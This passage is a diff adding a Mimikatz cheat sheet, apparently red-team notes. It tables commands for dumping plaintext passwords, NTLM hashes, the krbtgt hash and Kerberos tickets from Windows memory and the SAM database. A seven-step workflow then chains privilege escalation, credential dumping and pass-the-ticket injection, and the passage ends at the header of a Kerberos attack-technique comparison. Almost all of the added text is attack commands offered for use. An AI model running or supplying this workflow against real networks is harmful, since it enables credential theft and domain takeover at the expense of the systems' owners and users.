@@ -1,3 +1,65 @@
+# Mimikatz Commands Table
+
+Below is a comprehensive table of **Mimikatz** commands for extracting **Kerberos keys**, **NTLM hashes**, and **Kerberos tickets**, organized by functionality and including examples for each command.
+
+| **Category**                   | **Command**                                 | **Description**                                                                                       | **Example**                                  |
+|--------------------------------|---------------------------------------------|-------------------------------------------------------------------------------------------------------|----------------------------------------------|
+| **Privilege Escalation**      | `privilege::debug`                          | Elevates privileges to allow access to sensitive memory areas where credentials are stored.            | `privilege::debug`                           |
+|                                | `token::elevate /user:<username>`           | Elevates the current process token to that of the specified user, enabling access to their credentials.| `token::elevate /user:Administrator`         |
+| **Dumping Credentials**       | `sekurlsa::logonpasswords`                  | Retrieves plaintext passwords, NTLM hashes, and Kerberos tickets from memory.                        | `sekurlsa::logonpasswords`                    |
+|                                | `lsadump::sam`                              | Extracts NTLM hashes from the Security Account Manager (SAM) database.                               | `lsadump::sam`                                |
+|                                | `lsadump::lsa /inject /name:krbtgt`         | Dumps the **krbtgt** account hash, which is used to generate Kerberos tickets.                       | `lsadump::lsa /inject /name:krbtgt`           |
+| **Handling Kerberos Tickets**  | `kerberos::list /export`                    | Lists all Kerberos tickets currently in memory and exports them to a file.                           | `kerberos::list /export`                      |
+|                                | `kerberos::ptt <ticket_file>`               | Injects a Kerberos ticket (.kirbi file) into the current session.                                   | `kerberos::ptt evil_ticket.kirbi`             |
+|                                | `sekurlsa::tickets`                         | Displays all Kerberos tickets available in the current session.                                      | `sekurlsa::tickets`                           |
+|                                | `sekurlsa::kerberos`                        | Retrieves Kerberos-related information, including tickets and keys, from memory.                     | `sekurlsa::kerberos`                          |
+| **Exporting and Managing Keys**| `crypto::kerberos /export`                  | Exports Kerberos keys from the system for further analysis or use.                                   | `crypto::kerberos /export`                    |
+| **Additional Commands**        | `exit`                                      | Exits the Mimikatz session.                                                                           | `exit`                                        |
+|                                | `help`                                      | Displays help information for Mimikatz commands.                                                    | `help`                                        |
+
+---
+
+## Comprehensive Example Workflow
+
+Here's an example workflow that combines multiple commands to extract NTLM hashes and Kerberos tickets:
+
+1. **Elevate Privileges:**
+    ```plaintext
+    privilege::debug
+    ```
+
+2. **Dump Credentials:**
+    ```plaintext
+    sekurlsa::logonpasswords
+    ```
+
+3. **List and Export Kerberos Tickets:**
+    ```plaintext
+    kerberos::list /export
+    ```
+
+4. **Export Kerberos Keys:**
+    ```plaintext
+    crypto::kerberos /export
+    ```
+
+5. **Dump NTLM Hashes:**
+    ```plaintext
+    lsadump::sam
+    ```
+
+6. **Dump krbtgt Hash:**
+    ```plaintext
+    lsadump::lsa /inject /name:krbtgt
+    ```
+
+7. **Inject a Kerberos Ticket:**
+    ```plaintext
+    kerberos::ptt evil_ticket.kirbi
+    ```
+
+---
+
 # Kerberos Attack Techniques Comparison
 
 | **Technique**           | **What Is It?**                                                                                                                                                                                                 | **When to Use**                                                                                                                                                                                                          | **Why Use This Approach?**                                                                                                                                                                                                                                                                                                                                                                                                                                | **Basic Steps**                                                                                                                                                                                                                                       | **Example Commands/Tools**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
